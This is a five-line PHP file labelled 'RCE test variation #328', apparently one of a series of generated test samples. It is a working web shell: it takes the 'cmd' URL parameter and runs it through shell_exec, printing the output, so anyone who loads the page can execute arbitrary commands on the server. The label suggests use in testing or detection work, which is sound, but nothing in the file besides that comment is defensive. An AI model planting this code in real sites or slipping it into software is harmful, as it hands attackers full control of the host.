<?php
// RCE test variation #328
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>